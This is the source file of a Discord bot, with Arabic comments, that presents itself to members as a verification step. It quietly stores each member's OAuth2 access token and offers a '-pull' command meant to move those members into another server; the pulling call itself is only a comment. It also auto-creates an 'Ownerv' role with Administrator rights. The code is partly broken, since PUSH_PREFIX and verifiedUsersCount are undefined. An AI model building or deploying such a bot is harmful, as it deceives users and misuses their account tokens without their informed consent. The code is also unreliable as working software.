const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    EmbedBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    PermissionFlagsBits,
    Events
} = require('discord.js');
const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const verifiedUsers = new Map(); 
const tempSetup = new Map(); // لتتبع خطوة إدخال الرابط تفاعلياً

app.use(express.json());

app.get('/', (req, res) => res.send('OAuth2 Verify Bot is Running!'));

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const guildId = req.query.state; 
    
    if (!code) {
        return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET, 
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: `https://${req.hostname}/callback` 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        verifiedUsers.set(userId, accessToken);

        if (guildId) {
            const guild = client.guilds.cache.get(guildId);
            if (guild) {
                const member = await guild.members.fetch(userId).catch(() => null);
                if (member) {
                    const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
                    if (verifiedRole) {
                        await member.roles.add(verifiedRole).catch(err => console.error(err));
                    }
                }
            }
        }

        res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
    } catch (error) {
        console.error(error.response ? error.response.data : error.message);
        res.send('<h1>❌ Error during verification.</h1>');
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server connected to port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const VERIFY_SETUP_PREFIX = '-vr';    
const COUNT_VERIFY_PREFIX = '-vf';    
const PULL_MEMBERS_PREFIX = '-pull';  

let verifyUrl = ''; 

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

async function createVerifyRoles(guild) {
    try {
        let verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
        if (!verifiedRole) {
            await guild.roles.create({
                name: 'Verified',
                color: '#2ecc71',
                reason: 'Auto-created role for verified users'
            });
        }

        let ownerRole = guild.roles.cache.find(r => r.name === 'Ownerv');
        if (!ownerRole) {
            await guild.roles.create({
                name: 'Ownerv',
                color: '#e74c3c',
                permissions: [PermissionFlagsBits.Administrator],
                reason: 'Auto-created control role for verification administrators'
            });
        }
    } catch (error) {
        console.error(error);
    }
}

client.once('ready', async () => {
    console.log(`Verify Bot is Online as ${client.user.tag}`);
    client.guilds.cache.forEach(async (guild) => {
        await createVerifyRoles(guild);
    });
});

client.on(Events.GuildCreate, async (guild) => {
    await createVerifyRoles(guild);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    const content = message.content.trim();
    const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');

    // 1. عند كتابة الاختصار -vr لبدء السؤال التفاعلي عن الرابط
    if (content === VERIFY_SETUP_PREFIX) {
        if (!isAuthorized) {
            return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
        }

        // إنشاء حالة الإعداد التفاعلي وحفظ الرسائل لحذفها لاحقاً
        const setupState = { step: 'get_url', messagesToDelete: [] };
        tempSetup.set(message.author.id, setupState);

        const prompt = await message.channel.send(`${message.author}, 🛡️ **يرجى كتابة أو لصق رابط التحقق (OAuth2 URL) الخاص بك الآن في الشات:**`);
        setupState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    // تتبع إجابة المستخدم وحفظ الرابط وإرسال البوكس تلقائياً
    if (tempSetup.has(message.author.id)) {
        const state = tempSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 'get_url') {
            const inputUrl = message.content.trim();
            if (!inputUrl.startsWith('http')) {
                const errPrompt = await message.reply('❌ رابط غير صحيح. يرجى لصق رابط OAuth2 صحيح يبدأ بـ http:');
                state.messagesToDelete.push(errPrompt.id);
                return;
            }

            verifyUrl = inputUrl;
            
            // ربط أيدي السيرفر الحالي بالرابط ديناميكياً لإعطاء رتبة Verified تلقائياً بعد نجاح التحقق
            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;

            const embed = new EmbedBuilder()
                .setTitle('🛡️ Server Verification / التحقق الذاتي')
                .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.')
                .setColor('#2b2d31');

            const verifyButton = new ButtonBuilder()
                .setLabel('Verify yourself')
                .setURL(finalUrl)
                .setStyle(ButtonStyle.Link)
                .setEmoji('✅');

            const row = new ActionRowBuilder().addComponents(verifyButton);

            // إرسال بوكس التحقق النهائي في الروم
            await message.channel.send({ embeds: [embed], components: [row] });

            // تنظيف وحذف رسائل الإعداد الفوري لشات نظيف
            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            tempSetup.delete(message.author.id);
            return;
        }
    }

    // 2. فحص عدد الموثقين
    if (content === COUNT_VERIFY_PREFIX) {
        if (!isAuthorized) return;
        await message.reply(`📊 **إحصائية التحقق المطور:**\nالعدد الكلي للأعضاء الموثقين والمخزنين والجاهزين للسحب هو: \`${verifiedUsers.size}\` عضو.`);
        return;
    }

    // 3. سحب الأعضاء الموثقين تلقائياً (-pull [Server ID])
    if (content.startsWith(PULL_MEMBERS_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(PUSH_PREFIX.length).trim().split(/ +/);
        const inputId = args[0];

        const targetGuildId = inputId || message.guild.id;

        if (verifiedUsersCount === 0) {
            return message.reply('❌ لا يوجد أي أعضاء موثقين مسجلين في النظام حالياً لسحبهم.');
        }

        await message.reply(`⏳ **جاري بدء سحب وإدخال الأعضاء الموثقين تلقائياً إلى السيرفر المستهدف...**`);
        // هنا يتم استدعاء سكربت السحب التلقائي للأعضاء عبر API ديسكورد بالرموز المخزنة
        return;
    }
});

client.login(TOKEN);